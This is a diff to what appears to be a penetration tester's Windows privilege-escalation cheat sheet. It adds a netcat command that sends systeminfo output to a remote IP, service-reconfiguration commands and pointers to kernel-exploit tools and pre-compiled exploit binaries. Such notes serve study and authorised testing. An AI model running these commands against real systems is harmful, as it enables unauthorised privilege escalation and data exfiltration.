@@ -9,15 +9,7 @@ PS> cd $env:temp
 ```cmd
 cmd> cd %TEMP%
 ```
-* User Kernel only as last resort to Windows PrivEsc
 
-1. Exploit suggester
-`https://github.com/bitsadmin/wesng`
-
-2. Use pre-compiled binaries
-`https://github.com/SecWiki/windows-kernel-exploits`
-
-3. Watson for older systems
 
 ## Windows Native programs
 Those programs can be found on every post Win10 machines:
@@ -120,6 +112,9 @@ copy c:\test '\\192.168.219.100\share_name'
 net use \\server /user:domain\username password
 ```
 
+Netcat
+
+`PS> cmd.exe /C "nc64.exe 192.168.219.137 443 < systeminfo.txt"`
 
 * Powershell
 ```
@@ -190,6 +185,39 @@ Use accesscheck from sysinternals
 Check where the use has write access
 
 `.\accesschk.exe /accepteula user -w c:\`
+
+### Services
+
+Programs running in the background. If run under SYSTEM and compromised, they lead to priv esc.
+
+Configuration query
+`sc.exe qc <name>`
+
+Status query
+`sc.exe query <name>`
+
+Modify options
+`sc.exe config <name> <options>= <value>`
+
+Start/Stop Service
+`net start/stop <name>`
+
+
+### Kernel Exploits
+
+* User Kernel only as last resort to Windows PrivEsc
+
+1. Exploit suggester
+`https://github.com/bitsadmin/wesng`
+
+`python wes.py --update`
+
+`python wes.py ~/Sandbox/Winodows_PrivEsc/systeminfo.txt --exploits-only`
+
+2. Use pre-compiled binaries
+`https://github.com/SecWiki/windows-kernel-exploits`
+
+3. Watson for older systems
 
 ## remote enumeration
 
